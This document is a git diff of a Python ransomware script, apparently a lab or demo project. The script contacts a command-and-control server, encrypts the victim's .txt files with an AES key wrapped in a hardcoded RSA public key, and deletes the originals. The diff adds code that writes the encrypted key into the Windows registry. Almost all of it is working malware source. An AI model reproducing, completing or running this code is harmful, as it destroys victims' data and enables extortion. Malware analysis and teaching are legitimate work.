@@ -8,11 +8,14 @@
 5. Encrypt all files ending in (.txt, ...) with AES session key (refer to example)
 """
 import os
+import winreg as reg
+from pathlib import Path
 from base64 import b64encode 
 from requests import post, get
 from Cryptodome.PublicKey import RSA
-from Cryptodome.Random import get_random_bytes
+from tempfile import NamedTemporaryFile
 from Cryptodome.Cipher import AES, PKCS1_OAEP
+from Cryptodome.Random import get_random_bytes
 
 tgt_exts = ['txt']
 REMOTE_C2='http://192.168.230.128:9000'
@@ -27,7 +30,7 @@ MQIDAQAB
 -----END PUBLIC KEY-----'''
 
 def main():
-    #1. Generate AES session key
+    # Generate AES session key
     aes = get_random_bytes(16)
 
     # Send data to remote server
@@ -41,12 +44,16 @@ def main():
 
     public = RSA.import_key(PUBLIC_KEY.encode())
 
-    #2. Encrypt AES key with public RSA key
+    # Encrypt AES key with public RSA key
     c_rsa = PKCS1_OAEP.new(public)
     enc_aes = c_rsa.encrypt(aes)
+    # Testing
+    print('Encrypted AES key: ' + str(enc_aes))
     
-    #3. Traverse system, encrypt files with AES session key
-    sys_files = os.walk(os.getcwd()) #TODO: Change search directory!
+    # Traverse system, encrypt files with AES session key using algorithm
+    traverse_path = os.getcwd() # Start of traverse path -- FOR TESTING
+    #traverse_path = os.path.expanduser(`~`) # Start of traverse path -- FOR DEMO
+    sys_files = os.walk(traverse_path) 
     for root, dir, files in sys_files:
         for file in files:
             c_aes = AES.new(aes, AES.MODE_EAX)
@@ -63,6 +70,24 @@ def main():
                     [ f. write(x) for x in (enc_aes, c_aes.nonce, tag, ciphertext)]
 
                 os.remove(path)
+
+    # After done encrypting all files, write temp file of encrypted session key
+    cwd = Path.cwd()
+    f_path = '' # Temp file name
+    r_key = reg.HKEY_CURRENT_USER
+    with NamedTemporaryFile(dir=cwd) as tmpf:
+        tmpf.write(enc_aes)
+        f_path = tmpf.name
+    # Write encrypted session key tempfile to registry before deleting
+        try:
+            key = reg.CreateKey(r_key, f_path)
+            reg.SetValue(key, 'NO-ACCESS', reg.REG_SZ, str(enc_aes))
+            if key:
+                reg.CloseKey(key)
+        except Exception as e:
+            print('\tError writing to registry: ' + e)
+
+        tmpf.flush()
     print("Job Done")
 
 if __name__ == '__main__':
